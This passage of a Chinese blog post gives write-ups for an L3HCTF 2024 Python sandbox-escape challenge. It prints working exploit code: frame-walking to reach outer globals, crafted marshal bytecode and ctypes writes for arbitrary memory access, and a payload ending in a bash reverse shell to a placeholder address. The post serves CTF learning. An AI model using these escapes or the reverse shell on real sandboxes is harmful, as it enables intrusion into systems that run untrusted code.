+<p>所以我们要逃逸沙箱，获取到沙箱外的<code>__globals__</code></p>
+<h3 id="S1uM4i-WP"><a href="#S1uM4i-WP" class="headerlink" title="S1uM4i WP"></a>S1uM4i WP</h3><p><a target="_blank" rel="noopener" href="https://gist.github.com/lebr0nli/c2c0f42757f05813e3282c22114abe82">https://gist.github.com/lebr0nli/c2c0f42757f05813e3282c22114abe82</a></p>
+<div class="code-wrapper"><pre><code class="hljs Python">a = []
+g = ((g.gi_frame.f_back.f_back, gl:=g.gi_frame.f_back.f_back.f_globals) <span class="hljs-keyword">for</span> g <span class="hljs-keyword">in</span> a)
+a.append(g)
+g.send(<span class="hljs-literal">None</span>)</code></pre></div>
+
+<p>后续是这个原题</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/maple3142/My-CTF-Challenges/blob/master/TSJ%20CTF%202022/Just%20a%20pyjail/README.md">https://github.com/maple3142/My-CTF-Challenges/blob/master/TSJ%20CTF%202022/Just%20a%20pyjail/README.md</a></p>
+<p>主要是要修改offset的处理，不能通过io交互，直接本地生成一个marshal数据，之后观察构造，replace处理即可</p>
+<div class="code-wrapper"><pre><code class="hljs Python">a = []
+g = ((g.gi_frame.f_back.f_back, gl:=g.gi_frame.f_back.f_back.f_globals) <span class="hljs-keyword">for</span> g <span class="hljs-keyword">in</span> a)
+a.append(g)
+g.send(<span class="hljs-literal">None</span>)
+
+b = gl[<span class="hljs-string">&#x27;_&#x27;</span> <span class="hljs-string">&#x27;_builtins_&#x27;</span> <span class="hljs-string">&#x27;_&#x27;</span>]
+
+<span class="hljs-built_in">object</span> = b.<span class="hljs-built_in">object</span>
+<span class="hljs-built_in">bytearray</span> = b.<span class="hljs-built_in">bytearray</span>
+<span class="hljs-built_in">id</span> = b.<span class="hljs-built_in">id</span>
+<span class="hljs-built_in">print</span> = b.<span class="hljs-built_in">print</span>
+<span class="hljs-built_in">bytes</span> = b.<span class="hljs-built_in">bytes</span>
+<span class="hljs-built_in">input</span> = b.<span class="hljs-built_in">input</span>
+<span class="hljs-built_in">len</span> = b.<span class="hljs-built_in">len</span>
+<span class="hljs-built_in">hex</span> = b.<span class="hljs-built_in">hex</span>
+
+importer = b.<span class="hljs-built_in">getattr</span>(b, <span class="hljs-string">&quot;_&quot;</span> * <span class="hljs-number">2</span> + <span class="hljs-string">&quot;loader&quot;</span> + <span class="hljs-string">&quot;_&quot;</span> * <span class="hljs-number">2</span>)
+<span class="hljs-built_in">print</span>(importer)
+marshal = importer.load_module(<span class="hljs-string">&quot;marshal&quot;</span>)
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">p64</span>(<span class="hljs-params">addr</span>):
+    <span class="hljs-keyword">return</span> addr.to_bytes(<span class="hljs-number">8</span>, <span class="hljs-string">&quot;little&quot;</span>)
+
+const_tuple = ()
+
+fake_bytearray = <span class="hljs-built_in">bytearray</span>(
+    p64(<span class="hljs-number">0x41414141</span>)
+    + p64(<span class="hljs-built_in">id</span>(<span class="hljs-built_in">bytearray</span>))  <span class="hljs-comment"># ob_refcnt</span>
+    + p64(<span class="hljs-number">0x7FFFFFFFFFFFFFFF</span>)  <span class="hljs-comment"># ob_type</span>
+    + p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># ob_size (INT64_MAX)</span>
+    + p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># ob_alloc (doesn&#x27;t seem to really be used?)</span>
+    + p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># *ob_bytes (start at address 0)</span>
+    + p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># *ob_start (ditto)  # ob_exports (not really sure what this does)</span>
+)
+
+fake_bytearray_ptr_addr = <span class="hljs-built_in">id</span>(fake_bytearray) + <span class="hljs-number">0x20</span>
+const_tuple_array_start = <span class="hljs-built_in">id</span>(const_tuple) + <span class="hljs-number">0x18</span>
+offset = (fake_bytearray_ptr_addr - const_tuple_array_start) // <span class="hljs-number">8</span>
+<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Offset:&quot;</span>, offset)
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">dummy</span>():
+    <span class="hljs-keyword">pass</span>
+
+tt = <span class="hljs-string">b&#x27;e3000000000000000000000000000000000000000040000000f30a00000090aa90bb90cc64dd5300a9007202000000720200000072020000007202000000da00720300000000000000f300000000&#x27;</span>
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">i2h</span>(<span class="hljs-params">x</span>):
+    <span class="hljs-keyword">global</span> b
+    <span class="hljs-keyword">return</span> b.<span class="hljs-built_in">hex</span>(x)[<span class="hljs-number">2</span>:].rjust(<span class="hljs-number">2</span>, <span class="hljs-string">&quot;0&quot;</span>).encode()
+tt = tt.replace(<span class="hljs-string">b&quot;aa&quot;</span>, i2h((offset &gt;&gt; <span class="hljs-number">24</span>) &amp; <span class="hljs-number">0xFF</span>)).replace(<span class="hljs-string">b&quot;bb&quot;</span>, i2h((offset &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFF</span>)).replace(<span class="hljs-string">b&quot;cc&quot;</span>, i2h((offset &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>)).replace(<span class="hljs-string">b&quot;dd&quot;</span>, i2h((offset &gt;&gt; <span class="hljs-number">0</span>) &amp; <span class="hljs-number">0xFF</span>))
+
+<span class="hljs-built_in">print</span>(tt)
+bs = <span class="hljs-built_in">bytes</span>.fromhex(tt.decode())
+co = marshal.loads(bs)
+b.<span class="hljs-built_in">setattr</span>(dummy, <span class="hljs-string">&quot;_&quot;</span> * <span class="hljs-number">2</span> + <span class="hljs-string">&quot;code&quot;</span> + <span class="hljs-string">&quot;_&quot;</span> * <span class="hljs-number">2</span>, co)
+magic = dummy()
+
+<span class="hljs-comment"># sanity check</span>
+<span class="hljs-built_in">print</span>(magic[<span class="hljs-built_in">id</span>(<span class="hljs-string">&quot;peko&quot;</span>) : <span class="hljs-built_in">id</span>(<span class="hljs-string">&quot;peko&quot;</span>) + <span class="hljs-number">64</span>])
+
+target_strs = [
+    <span class="hljs-string">&quot;import&quot;</span>,
+    <span class="hljs-string">&quot;spawn&quot;</span>,
+    <span class="hljs-string">&quot;process&quot;</span>,
+    <span class="hljs-string">&quot;os&quot;</span>,
+    <span class="hljs-string">&quot;sys&quot;</span>,
+    <span class="hljs-string">&quot;cpython&quot;</span>,
+    <span class="hljs-string">&quot;fork&quot;</span>,
+    <span class="hljs-string">&quot;open&quot;</span>,
+    <span class="hljs-string">&quot;interpreter&quot;</span>,
+    <span class="hljs-string">&quot;ctypes&quot;</span>,
+    <span class="hljs-string">&quot;compile&quot;</span>,
+    <span class="hljs-string">&quot;gc&quot;</span>,
+    <span class="hljs-string">&quot;_&quot;</span> * <span class="hljs-number">2</span> + <span class="hljs-string">&quot;new&quot;</span> + <span class="hljs-string">&quot;_&quot;</span> * <span class="hljs-number">2</span>,
+]
+<span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> target_strs:
+    addr = <span class="hljs-built_in">id</span>(s)
+    magic[addr + <span class="hljs-number">48</span> : addr + <span class="hljs-number">48</span> + <span class="hljs-built_in">len</span>(s)] = <span class="hljs-string">b&quot;a&quot;</span> * <span class="hljs-built_in">len</span>(s)
+
+os = b.<span class="hljs-built_in">getattr</span>(b, <span class="hljs-string">&quot;_&quot;</span> * <span class="hljs-number">2</span> + <span class="hljs-string">&quot;import&quot;</span> + <span class="hljs-string">&quot;_&quot;</span> * <span class="hljs-number">2</span>)(<span class="hljs-string">&quot;os&quot;</span>)
+os.system(<span class="hljs-string">&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/xxx.xxx.xxx.xxx/1234 0&gt;&amp;1&quot;&#x27;</span>)
+
+factorization = <span class="hljs-keyword">lambda</span> x: (<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)</code></pre></div>
+
+<h4 id="自己生成观察一下规律"><a href="#自己生成观察一下规律" class="headerlink" title="自己生成观察一下规律"></a>自己生成观察一下规律</h4><p>根据原题给出的生成marshal序列化的代码，找一下规律</p>
+<div class="code-wrapper"><pre><code class="hljs pgsql"><span class="hljs-keyword">import</span> marshal
+<span class="hljs-keyword">from</span> dis <span class="hljs-keyword">import</span> opmap
+<span class="hljs-keyword">from</span> <span class="hljs-keyword">types</span> <span class="hljs-keyword">import</span> CodeType
+<span class="hljs-keyword">offset</span> = <span class="hljs-number">314894131665789</span>     #手动修改，找规律
+bc = bytes(
+    [
+        opmap[&quot;EXTENDED_ARG&quot;],
+        (<span class="hljs-keyword">offset</span> &gt;&gt; <span class="hljs-number">24</span>) &amp; <span class="hljs-number">0xFF</span>,
+        opmap[&quot;EXTENDED_ARG&quot;],
+        (<span class="hljs-keyword">offset</span> &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFF</span>,
+        opmap[&quot;EXTENDED_ARG&quot;],
+        (<span class="hljs-keyword">offset</span> &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>,
+        opmap[&quot;LOAD_CONST&quot;],
+        (<span class="hljs-keyword">offset</span> &gt;&gt; <span class="hljs-number">0</span>) &amp; <span class="hljs-number">0xFF</span>,
+        opmap[&quot;RETURN_VALUE&quot;],
+        <span class="hljs-number">0</span>,
+    ]
+)
+code = CodeType(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, bc, (), (), (), &quot;&quot;, &quot;&quot;, <span class="hljs-number">0</span>, b&quot;&quot;)
+
+print(marshal.dumps(code).hex().encode())</code></pre></div>
+
+<p>多次改变offset的值，对比生成的数据可以发现规律</p>
+<div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">e3000000000000000000000000000000000000000040000000f30a00000090</span> <span class="hljs-number">00</span> <span class="hljs-number">90</span> <span class="hljs-number">00</span> <span class="hljs-number">90</span> <span class="hljs-number">00</span> <span class="hljs-number">64</span> <span class="hljs-number">01</span> <span class="hljs-number">5300</span>a9007202000000720200000072020000007202000000da00720300000000000000f300000000
+<span class="hljs-attribute">e3000000000000000000000000000000000000000040000000f30a00000090</span> <span class="hljs-number">00</span> <span class="hljs-number">90</span> <span class="hljs-number">00</span> <span class="hljs-number">90</span> <span class="hljs-number">00</span> <span class="hljs-number">64</span> <span class="hljs-number">02</span> <span class="hljs-number">5300</span>a9007202000000720200000072020000007202000000da00720300000000000000f300000000
+<span class="hljs-attribute">e3000000000000000000000000000000000000000040000000f30a00000090</span> <span class="hljs-number">00</span> <span class="hljs-number">90</span> <span class="hljs-number">00</span> <span class="hljs-number">90</span> <span class="hljs-number">00</span> <span class="hljs-number">64</span> <span class="hljs-number">03</span> <span class="hljs-number">5300</span>a9007202000000720200000072020000007202000000da00720300000000000000f300000000
+<span class="hljs-attribute">e3000000000000000000000000000000000000000040000000f30a00000090</span> <span class="hljs-number">00</span> <span class="hljs-number">90</span> <span class="hljs-number">04</span> <span class="hljs-number">90</span> c3 <span class="hljs-number">64</span> f8 <span class="hljs-number">5300</span>a9007202000000720200000072020000007202000000da00720300000000000000f300000000
+<span class="hljs-attribute">e3000000000000000000000000000000000000000040000000f30a00000090</span> <span class="hljs-number">28</span> <span class="hljs-number">90</span> <span class="hljs-number">88</span> <span class="hljs-number">90</span> <span class="hljs-number">15</span> <span class="hljs-number">64</span> <span class="hljs-number">77</span> <span class="hljs-number">5300</span>a9007202000000720200000072020000007202000000da00720300000000000000f300000000
+<span class="hljs-attribute">e3000000000000000000000000000000000000000040000000f30a00000090</span> <span class="hljs-number">53</span> <span class="hljs-number">90</span> <span class="hljs-number">93</span> <span class="hljs-number">90</span> d9 <span class="hljs-number">64</span> <span class="hljs-number">53</span> <span class="hljs-number">5300</span>a9007202000000720200000072020000007202000000da00720300000000000000f300000000
+<span class="hljs-attribute">e3000000000000000000000000000000000000000040000000f30a00000090</span> <span class="hljs-number">00</span> <span class="hljs-number">90</span> dc <span class="hljs-number">90</span> <span class="hljs-number">1</span>b <span class="hljs-number">64</span> <span class="hljs-number">7</span>d <span class="hljs-number">5300</span>a9007202000000720200000072020000007202000000da00720300000000000000f300000000</code></pre></div>
+
+<p>不同的部分从前到后，分别代表<code>(offset &gt;&gt; 24) &amp; 0xFF</code>，<code>(offset &gt;&gt; 16) &amp; 0xFF</code>，<code>(offset &gt;&gt; 8) &amp; 0xFF</code>，<code>(offset &gt;&gt; 0) &amp; 0xFF</code></p>
+<p>所以payload中把不同部分用aa,bb,cc,dd表示，最后replace替换掉</p>
+<div class="code-wrapper"><pre><code class="hljs 1c">tt = b&#x27;e<span class="hljs-number">30000000000000</span><span class="hljs-number">00000000000000</span><span class="hljs-number">00000000000004</span><span class="hljs-number">000000</span>0f30a<span class="hljs-number">00000090</span>aa90bb90cc64dd<span class="hljs-number">5300</span>a<span class="hljs-number">90072020000007</span><span class="hljs-number">20200000072020</span><span class="hljs-number">00000720200000</span>0da<span class="hljs-number">00720300000000</span><span class="hljs-number">000000</span>f<span class="hljs-number">30000000</span>0&#x27;
+def i2h(x):
+    global b
+    return b.hex(x)[<span class="hljs-number">2</span>:].rjust(<span class="hljs-number">2</span>, <span class="hljs-string">&quot;0&quot;</span>).encode()    <span class="hljs-meta">#使长度为2，不足时用0填充</span>
+tt = tt.replace(b<span class="hljs-string">&quot;aa&quot;</span>, i2h((offset &gt;&gt; <span class="hljs-number">24</span>) <span class="hljs-meta">&amp; 0xFF)).replace(b&quot;bb&quot;, i2h((offset &gt;&gt; 16) &amp; 0xFF)).replace(b&quot;cc&quot;, i2h((offset &gt;&gt; 8) &amp; 0xFF)).replace(b&quot;dd&quot;, i2h((offset &gt;&gt; 0) &amp; 0xFF))</span></code></pre></div>
+
+<h3 id="官方WP-1"><a href="#官方WP-1" class="headerlink" title="官方WP"></a>官方WP</h3><p>可以用python的栈帧对象逃逸出沙箱从而获取到沙箱外的globals</p>
+<div class="code-wrapper"><pre><code class="hljs Python">a=(a.gi_frame.f_back.f_back <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> [<span class="hljs-number">1</span>])
+a=[x <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> a][<span class="hljs-number">0</span>]
+<span class="hljs-built_in">globals</span>=a.f_back.f_back.f_globals</code></pre></div>
+
+<p>可以注意到在判断答案是否正确时的globals与沙箱内获取到的globals相同，因此可以想办法破坏判断的过程绕过答案校验。一个可行的方法是替换掉int函数，使python在校验时使用我们给出的数据进行校验，payload如下：</p>
+<div class="code-wrapper"><pre><code class="hljs Python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">factorization</span>(<span class="hljs-params">n</span>):
+    a=(a.gi_frame.f_back.f_back <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> [<span class="hljs-number">1</span>])
+    a=[x <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> a][<span class="hljs-number">0</span>]
+    <span class="hljs-built_in">globals</span>=a.f_back.f_back.f_globals
+    builtin = <span class="hljs-built_in">globals</span>[<span class="hljs-string">&quot;_&quot;</span> + <span class="hljs-string">&quot;_builtins_&quot;</span> + <span class="hljs-string">&quot;_&quot;</span>]
+    
+    <span class="hljs-keyword">def</span> <span class="hljs-title function_">fakeint</span>(<span class="hljs-params">i</span>):
+        <span class="hljs-keyword">if</span>(builtin.<span class="hljs-built_in">len</span>(i)&gt;<span class="hljs-number">100</span>):
+            <span class="hljs-keyword">return</span> <span class="hljs-number">123123</span>*<span class="hljs-number">123123</span>
+        <span class="hljs-keyword">else</span>:
+            <span class="hljs-keyword">return</span> <span class="hljs-number">123123</span>
+
+    builtin.<span class="hljs-built_in">int</span>=fakeint
+    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span></code></pre></div>
+
+<p>W&amp;M也是替换掉int</p>
+<p>此外还有另一种解题方法，CPython中的字符串对象引用C底层堆中一个PyASCIIObject内存实体，相同的字符串具有同一个实体，所以我们可以利用ctypes库实现内存的任意读写，替换内存中字符串指向的值，从而替换掉最终进行校验的数值。注意import在此题中因为os和open无法使用，可以通过<code>__loader__.load_module</code>进行加载，同时PyASCIIObject的头部长度为48，我们需要对有效负载进行改写。payload如下：</p>
+<div class="code-wrapper"><pre><code class="hljs Python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">factorization</span>(<span class="hljs-params">n</span>):
+    a=(a.gi_frame.f_back.f_back <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> [<span class="hljs-number">1</span>])
+    a=[x <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> a][<span class="hljs-number">0</span>]
+    <span class="hljs-built_in">globals</span>=a.f_back.f_back.f_globals
+    builtin=<span class="hljs-string">&quot;_&quot;</span> + <span class="hljs-string">&quot;_builtins_&quot;</span> + <span class="hljs-string">&quot;_&quot;</span>
+    builtin=<span class="hljs-built_in">globals</span>[builtin]
+    ctypes=builtin.<span class="hljs-built_in">getattr</span>(builtin, <span class="hljs-string">&quot;_&quot;</span> + <span class="hljs-string">&quot;_loader_&quot;</span> + <span class="hljs-string">&quot;_&quot;</span>).load_module(<span class="hljs-string">&quot;ctypes&quot;</span>)
+    <span class="hljs-built_in">id</span>=builtin.<span class="hljs-built_in">id</span>
+    <span class="hljs-built_in">ord</span>=builtin.<span class="hljs-built_in">ord</span>
+    
+    <span class="hljs-keyword">def</span> <span class="hljs-title function_">writemem</span>(<span class="hljs-params">addr,value</span>):
+        p=ctypes.pointer(ctypes.pointer(ctypes.c_char(<span class="hljs-number">0</span>)))
+        p.contents=ctypes.c_longlong(addr)
+        p.contents.contents.value=value
+    addr=<span class="hljs-built_in">id</span>(n)
+    res=<span class="hljs-string">&#x27;1&#x27;</span>+<span class="hljs-string">&#x27;0&#x27;</span>*<span class="hljs-number">1232</span>
+    point=<span class="hljs-number">0</span>
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> res:
+        writemem(addr+<span class="hljs-number">48</span>+point,<span class="hljs-built_in">ord</span>(i))
+        point+=<span class="hljs-number">1</span>
+    <span class="hljs-keyword">return</span> <span class="hljs-number">10</span>**<span class="hljs-number">616</span>,<span class="hljs-number">10</span>**<span class="hljs-number">616</span></code></pre></div>
+
+<p>另有其他多种解法，如获取到内存对象后查找内存确定输出标识符位置、通过上述方法篡改hook函数中字符串绕过hook、通过inspect读栈帧代码输出正确字符串等方式，python使用极其灵活，本题有多种不同的逃逸思路。</p>
+<p>啊这，会不了一点。。。。。。。。</p>
+<h2 id="finally"><a href="#finally" class="headerlink" title="finally"></a>finally</h2><p>两个有能力做，一个想不到，还有一个完全不会。。。</p>
+<p>。。。学完了，跟没学一样，学不到东西啊</p>
+<h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p><a target="_blank" rel="noopener" href="https://s1um4i-official.feishu.cn/docx/QeGGdeyuhoR6kuxCOj8c44wRnne">https://s1um4i-official.feishu.cn/docx/QeGGdeyuhoR6kuxCOj8c44wRnne</a></p>
+<p><a target="_blank" rel="noopener" href="https://hust-l3hsec.feishu.cn/docx/MZ8SdwSoPo3cBTxOxbGcuUBun4c">‌⁡⁤⁤‌⁡﻿﻿⁡‬⁡⁢⁣‌‬⁣⁤‬‬‍⁤﻿⁤﻿﻿⁤⁡⁢‌⁣﻿‬‬‍﻿‬⁢‍⁢⁢⁡L3HCTF 2024 Official WriteUp - 飞书云文档 (feishu.cn)</a></p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/KHeSnJMUXAc_fV8Jpvg3uA">L3HCTF 2024 - Nep WP (qq.com)</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>L3HCTF-WEB</div>
+      <div>https://zer0peach.github.io/2024/02/06/L3HCTF-WEB/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Zer0peach</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年2月6日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/02/07/HGAME-WEEK2/" title="HGAME-WEEK2">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">HGAME-WEEK2</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/02/06/%E7%AC%AC%E4%BA%8C%E5%B1%8AN1CTF-Junior-Web/" title="第二届N1CTF Junior-Web">
+                        <span class="hidden-mobile">第二届N1CTF Junior-Web</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <a href="https://zer0peach.github.io"><span>author:Zer0peach</span></a> 
+    </div>
+  
+  
+  
+    <!-- 备案信息 ICP for China -->
+    <div class="beian">
+  <span>
+    <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
+      
+    </a>
+  </span>
+  
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
